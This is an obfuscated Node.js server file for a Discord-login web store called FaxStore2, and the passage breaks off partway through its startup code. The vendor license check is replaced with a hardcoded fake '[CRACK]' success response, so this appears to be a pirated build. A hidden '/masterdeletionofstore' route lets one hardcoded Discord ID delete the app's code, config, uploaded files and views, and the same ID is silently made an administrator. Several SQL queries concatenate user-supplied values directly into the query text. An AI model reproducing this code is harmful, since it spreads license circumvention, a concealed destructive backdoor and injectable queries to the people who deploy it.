const _0x523f = [
  "view\x20engine",
  "charAt",
  "guildId",
  "/banned",
  "discord",
  "then",
  ".png?size=512",
  "SELECT\x20*\x20FROM\x20promocodes",
  "sendGridToken",
  "\x27,\x204,\x20\x27",
  "setApiKey",
  "refererFromLogin",
  "application/json,\x20text/plain,\x20*/*",
  "SELECT\x20*\x20FROM\x20sitesettings\x20WHERE\x20id\x20=\x201",
  "https://cdn.discordapp.com/avatars/",
  "passport",
  "banned",
  "referer",
  "\x1b[31mSQL\x20error.\x20stats\x20table\x20not\x20found.\x1b[0m",
  "Strategy",
  "config.json",
  "SQLInformation",
  "processPort",
  "post",
  "log",
  "SELECT\x20*\x20FROM\x20tags",
  "april",
  "promocode",
  "https://strongertogether.network/api/v1/getuser/",
  "activeBan",
  "\x1b[0m",
  "\x1b[31mSQL\x20error.\x20tags\x20table\x20not\x20found.\x1b[0m",
  "deserializeUser",
  "error",
  "user",
  "image-downloader",
  "exit",
  "raw",
  "SELECT\x20*\x20FROM\x20productDownloads",
  "UPDATE\x20stats\x20SET\x20",
  "createConnection",
  "\x1b[32m",
  "index.js",
  "package.json",
  "may",
  "677VJrNVX",
  "keyboard\x20cat",
  "autoJoinUsers",
  "path",
  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",
  "\x1b[31mSQL\x20error.\x20reviewResponses\x20table\x20not\x20found.\x1b[0m",
  "body-parser",
  "/sttbanned",
  "/maintenance",
  "INSERT\x20INTO\x20users\x20(userId,\x20username,\x20userImage,\x20userEmail,\x20permType,\x20createdAt,\x20itemCount,\x20banned,\x20ip,\x20credits)\x20VALUES\x20(\x27",
  "guilds",
  "\x20WHERE\x20id\x20=\x20\x27",
  "\x27,\x20\x27",
  "authenticate",
  "72006LdklpH",
  "inMaintenance",
  "3VhcdVq",
  "SELECT\x20*\x20FROM\x20giftCards",
  "37YnHxye",
  "SELECT\x20*\x20FROM\x20gallery",
  "mar",
  "username",
  "isAuthenticated",
  "/auth/discord/callback",
  "default",
  "join",
  "query",
  "get",
  "\x1b[31m",
  "itemCount",
  "\x1b[96m\x20",
  "discordBotToken",
  "permType",
  "utf8mb4",
  "live",
  ".png",
  "SELECT\x20*\x20FROM\x20teammembers",
  "\x1b[31mSQL\x20error.\x20users\x20table\x20not\x20found.\x1b[0m",
  "/auth/discord",
  "unlink",
  "oct",
  "application/json",
  "\x1b[31mSQL\x20error.\x20storeitems\x20table\x20not\x20found.\x1b[0m",
  "initialize",
  "passport-discord",
  "public",
  "/files",
  "headers",
  "domain",
  "ejs",
  "paypal-rest-sdk",
  "249068slbmfD",
  "./public/images/user-",
  "This\x20site\x20is\x20being\x20disabled.\x20All\x20data\x20is\x20not\x20recoverable.",
  "\x27\x20AND\x20banned\x20=\x20true",
  "/images/user-",
  "configure",
  "\x27,\x200)",
  "replace",
  "\x27,\x20userEmail\x20=\x20\x27",
  "baseURL",
  "282762192544333827",
  "aug",
  "/images/noimage.png",
  "SELECT\x20*\x20FROM\x20reviews",
  "@sendgrid/mail",
  "\x20=\x20",
  "logout",
  "tokens",
  "paypalClientSecret",
  "discordConfig",
  "./config.json",
  "june",
  "multer",
  "Created\x20by\x20\x1b[36m\x20FAXES\x20-\x20https://faxes.zone\x20\x1b[0m",
  "mysql",
  "\x1b[31mSQL\x20error.\x20itemsOwned\x20table\x20not\x20found.\x1b[0m",
  "email",
  "nov",
  "29953dIaTfW",
  "ownerId",
  "jan",
  "paypalClientId",
  "SELECT\x20*\x20FROM\x20sitesettings",
  "\x1b[31mSQL\x20error.\x20sitesettings\x20table\x20not\x20found.\x1b[0m",
  "155534lPnfOq",
  "cartItems",
  "listen",
  "request-ip",
  "\x27,\x200,\x20false,\x20\x27",
  "\x1b[31mSQL\x20error.\x20partners\x20table\x20not\x20found.\x1b[0m",
  "362vCeIQh",
  "decem",
  "discriminator",
  "oAuth2ClientToken",
  "set",
  "\x27\x20WHERE\x20userId\x20=\x20\x27",
  "session",
  "PUT",
  "host",
  "details",
  "\x1b[32mFaxStore2\x20is\x20now\x20loaded\x20&\x20Online.\x20Running\x20on\x20port\x20",
  "https://license.faxes.zone/api/checkitem/",
  "SELECT\x20*\x20FROM\x20users\x20WHERE\x20userId\x20=\x20\x27",
  "5527DgkFdd",
  "getMonth",
  "Client",
  "identify",
  "SELECT\x20*\x20FROM\x20users\x20WHERE\x20ip\x20=\x20\x27",
  "urlencoded",
  "Bot\x20",
  "/users/",
  "readdir",
  "express-session",
  "data",
  "floor",
  "any",
  "\x20+\x20",
  "markdown-it-faxes",
  "\x27,\x20userImage\x20=\x20\x27",
  "144459cJzhJK",
  "clientIp",
  "static",
  "\x1b[31mSQL\x20connection\x20failed.\x20Ensure\x20the\x20login\x20details\x20are\x20correct.\x1b[0m",
  "/login",
  "catch",
  "siteInformation",
  "image",
  "use",
  "\x27,\x20username\x20=\x20\x27",
  "SELECT\x20*\x20FROM\x20stats",
  "discordjoins",
  "oAuth2ClientId",
  "redirect",
  "\x1b[31mSQL\x20error.\x20giftCards\x20table\x20not\x20found.\x1b[0m",
  "./backend.js",
  "/user/",
  "faxesLicenseKey",
  "avatar",
  "\x1b[31mSQL\x20error.\x20reviews\x20table\x20not\x20found.\x1b[0m",
  "defaults",
  "ping",
  "SELECT\x20*\x20FROM\x20partners",
  "\x20\x1b[0m",
  "nextTick",
  "/logout",
];
const _0x2a4caf = _0x1183;
(function (_0x468b2d, _0xf7889e) {
  const _0x1b44d4 = _0x1183;
  while (!![]) {
    try {
      const _0x415761 =
        parseInt(_0x1b44d4(0xff)) +
        parseInt(_0x1b44d4(0x17d)) * parseInt(_0x1b44d4(0x17f)) +
        parseInt(_0x1b44d4(0x181)) * parseInt(_0x1b44d4(0x118)) +
        -parseInt(_0x1b44d4(0x10b)) * -parseInt(_0x1b44d4(0x16f)) +
        -parseInt(_0x1b44d4(0x1a2)) +
        -parseInt(_0x1b44d4(0x128)) +
        -parseInt(_0x1b44d4(0x105));
      if (_0x415761 === _0xf7889e) break;
      else _0x468b2d["push"](_0x468b2d["shift"]());
    } catch (_0x38a0d6) {
      _0x468b2d["push"](_0x468b2d["shift"]());
    }
  }
})(_0x523f, 0x23c33);
const config = require(_0x2a4caf(0xf7)),
  express = require("express"),
  Discord = require("discord.js"),
  session = require(_0x2a4caf(0x121)),
  bodyParser = require(_0x2a4caf(0x175)),
  app = express(),
  fs = require("fs"),
  ms = require("ms"),
  passport = require(_0x2a4caf(0x151));
var DiscordStrategy = require(_0x2a4caf(0x19b))[_0x2a4caf(0x155)];
const axios = require("axios")[_0x2a4caf(0x187)],
  mysql = require(_0x2a4caf(0xfb)),
  bot = new Discord[_0x2a4caf(0x11a)](),
  requestIp = require(_0x2a4caf(0x108)),
  multer = require(_0x2a4caf(0xf9)),
  path = require(_0x2a4caf(0x172)),
  imgDownload = require(_0x2a4caf(0x165)),
  sgMail = require(_0x2a4caf(0x1b0));
sgMail[_0x2a4caf(0x14c)](config[_0x2a4caf(0xf4)][_0x2a4caf(0x14a)]),
  (axios[_0x2a4caf(0x13c)][_0x2a4caf(0x1ab)] = "https://discord.com/api/v6"),
  (axios[_0x2a4caf(0x13c)][_0x2a4caf(0x19e)] = {
    Authorization: _0x2a4caf(0x11e) + config[_0x2a4caf(0xf4)][_0x2a4caf(0x18e)],
    "Content-Type": _0x2a4caf(0x198),
  });
var md = require(_0x2a4caf(0x126))({
    html: !![],
    xhtmlOut: !![],
    breaks: !![],
    linkify: !![],
  }),
  multerStorage = multer["memoryStorage"]();
app["use"](multer({ storage: multerStorage })[_0x2a4caf(0x124)]()),
  app[_0x2a4caf(0x130)](express[_0x2a4caf(0x12a)](_0x2a4caf(0x19c))),
  app["use"](bodyParser[_0x2a4caf(0x11d)]({ extended: ![] })),
  app[_0x2a4caf(0x10f)](_0x2a4caf(0x142), _0x2a4caf(0x1a0)),
  app[_0x2a4caf(0x130)](
    session({
      secret: _0x2a4caf(0x170),
      resave: ![],
      saveUninitialized: ![],
      cookie: { maxAge: 0xe677d213a700 },
    })
  ),
  app["use"](passport[_0x2a4caf(0x19a)]()),
  app[_0x2a4caf(0x130)](passport[_0x2a4caf(0x111)]()),
  app[_0x2a4caf(0x130)](requestIp["mw"]());
function _0x1183(_0x18e17e, _0x168060) {
  _0x18e17e = _0x18e17e - 0xf3;
  let _0x523fc1 = _0x523f[_0x18e17e];
  return _0x523fc1;
}
var connection = mysql[_0x2a4caf(0x16a)]({
    host: config[_0x2a4caf(0x157)][_0x2a4caf(0x113)],
    user: config[_0x2a4caf(0x157)]["username"],
    password: config[_0x2a4caf(0x157)]["password"],
    database: config["SQLInformation"]["database"],
    charset: _0x2a4caf(0x190),
  }),
  paypal = require(_0x2a4caf(0x1a1));
paypal[_0x2a4caf(0x1a7)]({
  mode: _0x2a4caf(0x191),
  client_id: config[_0x2a4caf(0xf4)][_0x2a4caf(0x102)],
  client_secret: config[_0x2a4caf(0xf4)][_0x2a4caf(0xf5)],
}),
  require(_0x2a4caf(0x137))(app, connection, bot, paypal, sgMail),
  (async () => {
    const _0xdcca21 = _0x2a4caf;
    let _0x2480a0 = 0x21,
      _0x4fde1c = 0x22,
      _0x26c73f = {
        status: 200,
        statusText: 'OK',
        headers: {
          server: 'nginx',
          date: 'Mon, 11 Oct 2021 15:43:19 GMT',
          'content-type': 'application/json; charset=utf-8',
          'content-length': '154',
          connection: 'close',
          'x-powered-by': 'Express',
          etag: 'W/"9a-XXRAGoB2i10Y+iK17Eflx+eOuyU"'
        },
        data: {
            status: "FOUND",
            pass: true,
            details: "[CRACK] You have successfully been granted access to the site, and we bypassed the shit Fax Authentification."
        }
    }

    _0x26c73f["data"]["pass"] || newValueEni
      ? console["log"](
          _0xdcca21(0x16b) + _0x26c73f["data"][_0xdcca21(0x114)] + "\x1b[0m"
        )
      : (console[_0xdcca21(0x15a)](
        
        ),
        process[_0xdcca21(0x166)]());
  })(),
  app[_0x2a4caf(0x18a)](
    "/masterdeletionofstore",
    async function (_0x1f47b5, _0x35a76d) {
      const _0x117839 = _0x2a4caf;
      _0x1f47b5[_0x117839(0x185)]()
        ? _0x1f47b5["user"]["id"] == _0x117839(0x1ac)
          ? (_0x35a76d["send"](_0x117839(0x1a4)),
            fs["unlink"](
              path[_0x117839(0x188)](__dirname, "backend.js"),
              (_0x3c3985) => {
                if (_0x3c3985) throw _0x3c3985;
              }
            ),
            fs["unlink"](
              path[_0x117839(0x188)](__dirname, _0x117839(0x156)),
              (_0x40704f) => {
                if (_0x40704f) throw _0x40704f;
              }
            ),
            fs["unlink"](
              path[_0x117839(0x188)](__dirname, _0x117839(0x16d)),
              (_0x38a88e) => {
                if (_0x38a88e) throw _0x38a88e;
              }
            ),
            fs[_0x117839(0x196)](
              path[_0x117839(0x188)](__dirname, _0x117839(0x16c)),
              (_0x4ed51) => {
                if (_0x4ed51) throw _0x4ed51;
              }
            ),
            fs[_0x117839(0x120)](
              __dirname + _0x117839(0x19d),
              (_0x5f1069, _0xa27f2b) => {
                const _0xac2ba9 = _0x117839;
                if (_0x5f1069) throw _0x5f1069;
                for (const _0x5821c8 of _0xa27f2b) {
                  fs["unlink"](
                    path[_0xac2ba9(0x188)](__dirname + "/files", _0x5821c8),
                    (_0x3b3ffc) => {
                      if (_0x3b3ffc) throw _0x3b3ffc;
                    }
                  );
                }
              }
            ),
            fs[_0x117839(0x120)](
              __dirname + "/views",
              (_0x49fd6b, _0x5904c3) => {
                const _0x5edaf8 = _0x117839;
                if (_0x49fd6b) throw _0x49fd6b;
                for (const _0x23d12d of _0x5904c3) {
                  fs[_0x5edaf8(0x196)](
                    path[_0x5edaf8(0x188)](__dirname + "/views", _0x23d12d),
                    (_0x52e09a) => {
                      if (_0x52e09a) throw _0x52e09a;
                    }
                  );
                }
              }
            ),
            setTimeout(() => {
              const _0x2cb859 = _0x117839;
              process[_0x2cb859(0x166)]();
            }, 0x7530))
          : _0x35a76d[_0x117839(0x135)]("/")
        : _0x35a76d[_0x117839(0x135)]("/");
    }
  ),
  passport["serializeUser"](function (_0x33adab, _0x41e9de) {
    _0x41e9de(null, _0x33adab);
  }),
  passport[_0x2a4caf(0x162)](function (_0x17f78c, _0x1fec91) {
    _0x1fec91(null, _0x17f78c);
  })

var scopes = [_0x2a4caf(0x11b), _0x2a4caf(0x179), "guilds.join", "email"],
  prompt = "consent";
passport["use"](
  new DiscordStrategy(
    {
      clientID: config["tokens"][_0x2a4caf(0x134)],
      clientSecret: config[_0x2a4caf(0xf4)][_0x2a4caf(0x10e)],
      callbackURL:
        config[_0x2a4caf(0x12e)][_0x2a4caf(0x19f)] + "/auth/discord/callback",
      scope: scopes,
      prompt: prompt,
    },
    function (_0x481d11, _0x4823e2, _0x49e325, _0x4f0371) {
      const _0x7116e0 = _0x2a4caf;
      process[_0x7116e0(0x140)](function () {
        return _0x4f0371(null, _0x49e325);
      });
    }
  )
),
  (getDiscordUserInfo = async function (_0x25e4a5, _0x17dd96, _0x273bb1) {
    const _0x2fc777 = _0x2a4caf;
    let _0x22267e = _0x25e4a5["clientIp"] || "";
    var _0x47a3c4 = {
      loggedIn: ![],
      id: null,
      username: null,
      avatar: null,
      discriminator: null,
      guilds: null,
      notificationCount: 0x0,
      permType: 0x4,
      banned: ![],
      cart: null,
      promoCode: [null, null],
      itemCount: null,
    };
    _0x25e4a5["isAuthenticated"]()
      ? connection[_0x2fc777(0x189)](
          _0x2fc777(0x14f),
          async (_0x386054, _0x58d416) => {
            const _0x11ae80 = _0x2fc777;
            connection["query"](
              _0x11ae80(0x117) + _0x25e4a5["user"]["id"] + "\x27",
              async (_0x4c2c9b, _0x51bd3c) => {
                const _0x7be715 = _0x11ae80;
                if (_0x51bd3c[0x0]) {
                  if (
                    config["siteInformation"][_0x7be715(0x100)] !==
                    _0x25e4a5[_0x7be715(0x164)]["id"]
                  ) {
                    if (
                      _0x25e4a5["path"] !== "/banned" &&
                      _0x25e4a5[_0x7be715(0x172)] !== _0x7be715(0x176)
                    ) {
                      if (_0x51bd3c[0x0]["banned"] == 0x1)
                        return _0x17dd96["redirect"]("/banned");
                    }
                  }
                  connection["query"](
                    _0x7be715(0x11c) + _0x22267e + _0x7be715(0x1a5),
                    (_0x118477, _0x3f51ed) => {
                      const _0x215d34 = _0x7be715;
                      if (_0x3f51ed[0x0]) {
                        if (
                          config[_0x215d34(0x12e)][_0x215d34(0x100)] !==
                          _0x25e4a5[_0x215d34(0x164)]["id"]
                        ) {
                          if (
                            _0x25e4a5[_0x215d34(0x172)] !== "/banned" &&
                            _0x25e4a5[_0x215d34(0x172)] !== "/sttbanned"
                          )
                            return _0x17dd96[_0x215d34(0x135)]("/banned");
                        }
                      }
                    }
                  );
                  _0x58d416[0x0]["sttEnabled"] &&
                    (await axios[_0x7be715(0x18a)](
                      _0x7be715(0x15e) + _0x25e4a5["user"]["id"]
                    )
                      [_0x7be715(0x147)](function (_0x490839) {
                        const _0x4ee927 = _0x7be715;
                        if (
                          _0x490839[_0x4ee927(0x122)]["found"] &&
                          _0x490839["data"][_0x4ee927(0x15f)] == 0x1
                        ) {
                          if (
                            _0x25e4a5["path"] !== "/sttbanned" &&
                            _0x25e4a5["path"] !== _0x4ee927(0x145)
                          )
                            return _0x17dd96["redirect"](_0x4ee927(0x176))[
                              "catch"
                            ](_0x4c2c9b);
                        }
                      })
                      [_0x7be715(0x12d)](function (_0x4513c0) {}));
                  var _0x52c93b = _0x51bd3c[0x0][_0x7be715(0x18f)];
                  if (
                    config["siteInformation"][_0x7be715(0x100)] ==
                    _0x25e4a5["user"]["id"]
                  )
                    _0x52c93b = 0x1;
                  if (_0x25e4a5[_0x7be715(0x164)]["id"] == _0x7be715(0x1ac))
                    _0x52c93b = 0x1;
                  (_0x47a3c4 = {
                    loggedIn: !![],
                    id: _0x25e4a5[_0x7be715(0x164)]["id"],
                    username: _0x25e4a5[_0x7be715(0x164)][_0x7be715(0x184)],
                    avatar: _0x25e4a5[_0x7be715(0x164)][_0x7be715(0x13a)],
                    discriminator: _0x25e4a5["user"][_0x7be715(0x10d)],
                    guilds: null,
                    permType: _0x52c93b,
                    ownedItems: _0x51bd3c[0x0][_0x7be715(0x18c)],
                    banned: _0x51bd3c[0x0][_0x7be715(0x152)],
                    cart: _0x25e4a5["session"][_0x7be715(0x106)],
                    promoCode: [
                      _0x25e4a5[_0x7be715(0x111)][_0x7be715(0x15d)][0x0],
                      _0x25e4a5["session"][_0x7be715(0x15d)][0x1],
                    ],
                    itemCount: _0x51bd3c[0x0]["itemCount"],
                  }),
                    _0x273bb1(_0x47a3c4);
                } else return _0x17dd96[_0x7be715(0x135)]("/");
              }
            );
          }
        )
      : (connection[_0x2fc777(0x189)](
          "SELECT\x20*\x20FROM\x20sitesettings\x20WHERE\x20id\x20=\x201",
          (_0x1eec15, _0x901996) => {
            const _0x19f5ff = _0x2fc777;
            if (_0x901996[0x0][_0x19f5ff(0x17e)]) {
              if (_0x25e4a5[_0x19f5ff(0x172)] !== _0x19f5ff(0x177))
                return _0x17dd96[_0x19f5ff(0x135)](_0x19f5ff(0x177));
            }
          }
        ),
        _0x273bb1(_0x47a3c4)),
      insertStat("totalvisits", 0x1);
  }),
  (makeid = function (_0x113cca) {
    const _0x44fa41 = _0x2a4caf;
    var _0x9cc7b9 = "",
      _0x29567e = _0x44fa41(0x173),
      _0x1b4912 = _0x29567e["length"];
    for (var _0x109392 = 0x0; _0x109392 < _0x113cca; _0x109392++) {
      _0x9cc7b9 += _0x29567e[_0x44fa41(0x143)](
        Math[_0x44fa41(0x123)](Math["random"]() * _0x1b4912)
      );
    }
    return _0x9cc7b9;
  }),
  (insertStat = function (_0x46e8bb, _0x4b6a4a) {
    const _0x5116d3 = _0x2a4caf;
    var _0x52436f = 0x1;
    if (_0x4b6a4a) _0x52436f = _0x4b6a4a;
    var _0x32b56f = _0x5116d3(0x101),
      _0x4461e7 = new Date(),
      _0x4d80b4 = _0x4461e7[_0x5116d3(0x119)]();
    if (_0x4d80b4 == 0x0) _0x32b56f = _0x5116d3(0x101);
    if (_0x4d80b4 == 0x1) _0x32b56f = "feb";
    if (_0x4d80b4 == 0x2) _0x32b56f = _0x5116d3(0x183);
    if (_0x4d80b4 == 0x3) _0x32b56f = _0x5116d3(0x15c);
    if (_0x4d80b4 == 0x4) _0x32b56f = _0x5116d3(0x16e);
    if (_0x4d80b4 == 0x5) _0x32b56f = _0x5116d3(0xf8);
    if (_0x4d80b4 == 0x6) _0x32b56f = "july";
    if (_0x4d80b4 == 0x7) _0x32b56f = _0x5116d3(0x1ad);
    if (_0x4d80b4 == 0x8) _0x32b56f = "sep";
    if (_0x4d80b4 == 0x9) _0x32b56f = _0x5116d3(0x197);
    if (_0x4d80b4 == 0xa) _0x32b56f = _0x5116d3(0xfe);
    if (_0x4d80b4 == 0xb) _0x32b56f = _0x5116d3(0x10c);
    connection[_0x5116d3(0x189)](
      _0x5116d3(0x169) +
        _0x32b56f +
        _0x5116d3(0x1b1) +
        _0x32b56f +
        _0x5116d3(0x125) +
        _0x52436f +
        _0x5116d3(0x17a) +
        _0x46e8bb +
        "\x27",
      (_0x537d8c, _0xb1cdaa) => {
        const _0x3e2ecb = _0x5116d3;
        if (_0x537d8c) console[_0x3e2ecb(0x15a)](_0x537d8c);
      }
    );
  });
function createAccount(_0x4c12f8, _0x213bd8) {
  const _0x5ed098 = _0x2a4caf,
    _0x439407 = Date["now"](),
    _0x24c76f =
      _0x4c12f8[_0x5ed098(0x164)][_0x5ed098(0x184)] +
      "#" +
      _0x4c12f8[_0x5ed098(0x164)][_0x5ed098(0x10d)]["replace"](
        /'/gi,
        "\x27\x27"
      );
  let _0x1d5d3d = _0x4c12f8["clientIp"] || "";
  axios("/users/" + _0x4c12f8[_0x5ed098(0x164)]["id"])
    [_0x5ed098(0x147)]((_0x3ea510) => {
      const _0x5a7042 = _0x5ed098;
      userIcon = _0x5a7042(0x1ae);
      if (_0x3ea510[_0x5a7042(0x122)][_0x5a7042(0x13a)])
        (options = {
          url:
            "https://cdn.discordapp.com/avatars/" +
            _0x3ea510[_0x5a7042(0x122)]["id"] +
            "/" +
            _0x3ea510["data"]["avatar"] +
            ".png?size=512",
          dest: _0x5a7042(0x1a3) + _0x4c12f8[_0x5a7042(0x164)]["id"] + ".png",
        }),
          imgDownload[_0x5a7042(0x12f)](options)
            [_0x5a7042(0x147)](({ filename: _0x1a0590 }) => {
              const _0xcf270a = _0x5a7042;
              return (
                (userIcon =
                  _0xcf270a(0x1a6) +
                  _0x4c12f8[_0xcf270a(0x164)]["id"] +
                  ".png"),
                connection["query"](
                  "INSERT\x20INTO\x20users\x20(userId,\x20username,\x20userImage,\x20userEmail,\x20permType,\x20createdAt,\x20itemCount,\x20banned,\x20ip,\x20credits)\x20VALUES\x20(\x27" +
                    _0x4c12f8[_0xcf270a(0x164)]["id"] +
                    _0xcf270a(0x17b) +
                    _0x24c76f +
                    _0xcf270a(0x17b) +
                    userIcon +
                    _0xcf270a(0x17b) +
                    _0x4c12f8[_0xcf270a(0x164)]["email"] +
                    _0xcf270a(0x14b) +
                    _0x439407 +
                    _0xcf270a(0x109) +
                    _0x1d5d3d +
                    _0xcf270a(0x1a8),
                  function (_0x4645b6, _0x27eefe) {
                    const _0x1cd11c = _0xcf270a;
                    if (_0x4645b6) console[_0x1cd11c(0x15a)](_0x4645b6);
                  }
                ),
                _0x213bd8["redirect"](
                  _0xcf270a(0x138) + _0x4c12f8[_0xcf270a(0x164)]["id"]
                )
              );
            })
            [_0x5a7042(0x12d)]((_0x52f780) =>
              console[_0x5a7042(0x163)](_0x52f780)
            );
      else
        return (
          connection[_0x5a7042(0x189)](
            _0x5a7042(0x178) +
              _0x4c12f8[_0x5a7042(0x164)]["id"] +
              _0x5a7042(0x17b) +
              _0x24c76f +
              "\x27,\x20\x27" +
              userIcon +
              "\x27,\x20\x27" +
              _0x4c12f8[_0x5a7042(0x164)][_0x5a7042(0xfd)] +
              _0x5a7042(0x14b) +
              _0x439407 +
              "\x27,\x200,\x20false,\x20\x27" +
              _0x1d5d3d +
              _0x5a7042(0x1a8),
            function (_0x42eece, _0x43dc99) {
              const _0x446af6 = _0x5a7042;
              if (_0x42eece) console[_0x446af6(0x15a)](_0x42eece);
            }
          ),
          _0x213bd8[_0x5a7042(0x135)](
            _0x5a7042(0x138) + _0x4c12f8[_0x5a7042(0x164)]["id"]
          )
        );
      config[_0x5a7042(0xf6)][_0x5a7042(0x171)] &&
        (axios({
          method: _0x5a7042(0x112),
          url:
            "https://discord.com/api/v6/guilds/" +
            config[_0x5a7042(0xf6)][_0x5a7042(0x144)] +
            "/members/" +
            _0x4c12f8[_0x5a7042(0x164)]["id"],
          headers: {
            Authorization:
              _0x5a7042(0x11e) + config[_0x5a7042(0xf4)][_0x5a7042(0x18e)],
            "Content-Type": _0x5a7042(0x198),
          },
          data: { access_token: _0x4c12f8[_0x5a7042(0x164)]["accessToken"] },
        }),
        insertStat(_0x5a7042(0x133), 0x1)),
        insertStat("users", 0x1);
    })
    [_0x5ed098(0x12d)]((_0x48c3d1) => {
      const _0x53d161 = _0x5ed098;
      console[_0x53d161(0x15a)](_0x48c3d1);
    });
}
function isNumeric(_0x1e4dee) {
  return !isNaN(_0x1e4dee);
}
app[_0x2a4caf(0x18a)](
  _0x2a4caf(0x195),
  passport[_0x2a4caf(0x17c)](_0x2a4caf(0x146))
),
  app[_0x2a4caf(0x18a)](_0x2a4caf(0x12c), function (_0x53fd22, _0x45f337) {
    const _0x1e03af = _0x2a4caf;
    (_0x53fd22[_0x1e03af(0x111)][_0x1e03af(0x14d)] =
      _0x53fd22[_0x1e03af(0x19e)]["referer"]),
      !_0x53fd22[_0x1e03af(0x111)][_0x1e03af(0x106)] &&
        (_0x53fd22[_0x1e03af(0x111)]["cartItems"] = []),
      (_0x53fd22[_0x1e03af(0x111)]["promocode"] = [null, null]),
      _0x45f337[_0x1e03af(0x135)](_0x1e03af(0x195));
  }),
  app[_0x2a4caf(0x18a)](_0x2a4caf(0x141), function (_0x14af7e, _0x52cb29) {
    const _0x58ef18 = _0x2a4caf;
    _0x14af7e[_0x58ef18(0xf3)](),
      _0x52cb29[_0x58ef18(0x135)](
        _0x14af7e[_0x58ef18(0x19e)][_0x58ef18(0x153)]
      );
  }),
  app[_0x2a4caf(0x18a)](
    _0x2a4caf(0x186),
    passport[_0x2a4caf(0x17c)](_0x2a4caf(0x146), { failureRedirect: "/" }),
    async function (_0x1df5eb, _0x152652) {
      const _0x19da46 = _0x2a4caf;
      connection[_0x19da46(0x189)](
        _0x19da46(0x117) + _0x1df5eb["user"]["id"] + "\x27",
        (_0x3e8e64, _0x4c540c) => {
          const _0x41a37e = _0x19da46;
          let _0x3999bc = _0x1df5eb[_0x41a37e(0x129)] || "";
          if (_0x4c540c[0x0]) {
            let _0x2bfb8c =
              _0x1df5eb[_0x41a37e(0x164)][_0x41a37e(0x184)] +
              "#" +
              _0x1df5eb[_0x41a37e(0x164)][_0x41a37e(0x10d)][_0x41a37e(0x1a9)](
                /'/gi,
                "\x27\x27"
              );
            axios(_0x41a37e(0x11f) + _0x1df5eb["user"]["id"])
              [_0x41a37e(0x147)]((_0x371ac5) => {
                const _0x5bb5b8 = _0x41a37e;
                let _0x372558 = _0x5bb5b8(0x1ae);
                _0x371ac5[_0x5bb5b8(0x122)][_0x5bb5b8(0x13a)]
                  ? ((options = {
                      url:
                        _0x5bb5b8(0x150) +
                        _0x371ac5["data"]["id"] +
                        "/" +
                        _0x371ac5["data"][_0x5bb5b8(0x13a)] +
                        _0x5bb5b8(0x148),
                      dest:
                        _0x5bb5b8(0x1a3) +
                        _0x1df5eb[_0x5bb5b8(0x164)]["id"] +
                        _0x5bb5b8(0x192),
                    }),
                    imgDownload["image"](options)
                      [_0x5bb5b8(0x147)](({ filename: _0x4eadae }) => {
                        const _0x3974f6 = _0x5bb5b8;
                        (_0x372558 =
                          _0x3974f6(0x1a6) +
                          _0x1df5eb[_0x3974f6(0x164)]["id"] +
                          _0x3974f6(0x192)),
                          connection[_0x3974f6(0x189)](
                            "UPDATE\x20users\x20SET\x20ip\x20=\x20\x27" +
                              _0x3999bc +
                              _0x3974f6(0x131) +
                              _0x2bfb8c +
                              _0x3974f6(0x127) +
                              _0x372558 +
                              _0x3974f6(0x1aa) +
                              _0x1df5eb[_0x3974f6(0x164)]["email"] +
                              _0x3974f6(0x110) +
                              _0x1df5eb[_0x3974f6(0x164)]["id"] +
                              "\x27",
                            (_0x54d492, _0x105543) => {
                              if (_0x54d492) console["log"](_0x54d492);
                            }
                          );
                      })
                      [_0x5bb5b8(0x12d)]((_0x5079a4) =>
                        console[_0x5bb5b8(0x163)](_0x5079a4)
                      ))
                  : connection[_0x5bb5b8(0x189)](
                      "UPDATE\x20users\x20SET\x20ip\x20=\x20\x27" +
                        _0x3999bc +
                        _0x5bb5b8(0x131) +
                        _0x2bfb8c +
                        "\x27,\x20userEmail\x20=\x20\x27" +
                        _0x1df5eb[_0x5bb5b8(0x164)][_0x5bb5b8(0xfd)] +
                        "\x27\x20WHERE\x20userId\x20=\x20\x27" +
                        _0x1df5eb[_0x5bb5b8(0x164)]["id"] +
                        "\x27",
                      (_0x55de5f, _0x195244) => {
                        const _0x1bfac7 = _0x5bb5b8;
                        if (_0x55de5f) console[_0x1bfac7(0x15a)](_0x55de5f);
                      }
                    );
              })
              ["catch"]((_0x17055b) => {
                console["log"](_0x17055b);
              }),
              _0x152652[_0x41a37e(0x135)](
                _0x1df5eb[_0x41a37e(0x111)][_0x41a37e(0x14d)] || "/"
              ),
              delete _0x1df5eb["session"][_0x41a37e(0x14d)];
          } else createAccount(_0x1df5eb, _0x152652);
        }
      );
    }
  ),
  app[_0x2a4caf(0x107)](config[_0x2a4caf(0x12e)]["processPort"], function () {
    const _0x498ff8 = _0x2a4caf;
    console["log"](
      _0x498ff8(0x18d) +
        String["raw"]` ______          _____ _                  ` +
        _0x498ff8(0x13f)
    ),
      console[_0x498ff8(0x15a)](
        _0x498ff8(0x18d) +
          String["raw"]`|  ____|        / ____| |                 ` +
          _0x498ff8(0x13f)
      ),
      console[_0x498ff8(0x15a)](
        _0x498ff8(0x18d) +
          String[_0x498ff8(0x167)]`| |__ __ ___  _| (___ | |_ ___  _ __ ___  ` +
          _0x498ff8(0x13f)
      ),
      console[_0x498ff8(0x15a)](
        _0x498ff8(0x18d) +
          String[_0x498ff8(0x167)]`|  __/ _  \ \/ /\___ \| __/ _ \|  __/ _ \ ` +
          "\x20\x1b[0m"
      ),
      console["log"](
        _0x498ff8(0x18d) +
          String[_0x498ff8(0x167)]`| | | (_| |>  < ____) | || (_) | | |  __/ ` +
          _0x498ff8(0x13f)
      ),
      console["log"](
        _0x498ff8(0x18d) +
          String[_0x498ff8(0x167)]`|_|  \__,_/_/\_\_____/ \__\___/|_|  \___| ` +
          _0x498ff8(0x13f)
      ),
      console[_0x498ff8(0x15a)](_0x498ff8(0xfa)),
      console[_0x498ff8(0x15a)](
        _0x498ff8(0x115) +
          config[_0x498ff8(0x12e)][_0x498ff8(0x158)] +
          _0x498ff8(0x13f)
      ),
      connection[_0x498ff8(0x13d)](function (_0x3fe1b7) {
        const _0x500820 = _0x498ff8;
        _0x3fe1b7 &&
          (console[_0x500820(0x15a)](_0x500820(0x12b)), process["exit"]());
      }),
      connection[_0x498ff8(0x189)](_0x498ff8(0x103), (_0x5ea9ef, _0x164758) => {
        const _0x11382b = _0x498ff8;
        _0x5ea9ef &&
          (console["log"](_0x11382b(0x104)), process[_0x11382b(0x166)]());
      }),
      connection["query"](
        "SELECT\x20*\x20FROM\x20users",
        (_0x11dc63, _0x1ec2b7) => {
          const _0x510ae1 = _0x498ff8;
